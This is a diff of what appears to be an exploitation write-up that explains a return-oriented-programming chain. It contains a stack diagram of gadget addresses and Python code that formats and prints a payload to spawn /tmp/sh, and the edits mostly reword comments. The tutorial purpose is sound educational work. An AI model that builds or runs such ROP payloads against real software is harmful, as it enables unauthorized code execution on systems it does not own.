@@ -300,7 +300,7 @@ For this to work, we need the input (and by proxy the stack) to look like this:
  ________________ < ebp
 | 0x1a9e         | <- pop edx ; ret
  ________________ 
-|\x00\x00\x00\x00| <- this gets loaded into edx, because it can be NULL
+|\x00\x00\x00\x00| <- value of edx
  ________________ 
 | 0x3900e        | <- and al, 8 ; add esp, 0xc ; ret
  ________________ 
@@ -312,7 +312,7 @@ For this to work, we need the input (and by proxy the stack) to look like this:
  ________________ 
 | 0xc24f7        | <- push esp ; xor eax, eax ; pop ebx ; pop ebp
  ________________ 
-|\x00\x00\x00\x00| <- this goes onto ebp
+|\x00\x00\x00\x00| <- this goes onto ebp, side-effect
  ________________ 
 | 0x12acce       | <- dec ebx -- repeated 9 times, so that the gadget executes 9 times, used to setup ebx to point to /tmp/sh
  ________________ 
@@ -362,7 +362,8 @@ add_ecx_ebx = l(0xcaf24)
 set_eax_interrupt = l(0x97193)
 
 fmt = "{0}{1}{2}{3}{4}{5}{2}" + "{6}"*9 + "{8}" + "{6}"*7 +"{7}"
-sys.stdout.write(fmt.format(padding, pop_edx, NULL, add_esp_12, binsh_str, push_esp, dec_ebx, set_eax_interrupt, add_ecx_ebx).strip())
+payload = fmt.format(padding, pop_edx, NULL, add_esp_12, binsh_str, push_esp, dec_ebx, set_eax_interrupt, add_ecx_ebx).strip()
+sys.stdout.write(payload)
 sys.stdout.flush()
 ```
 
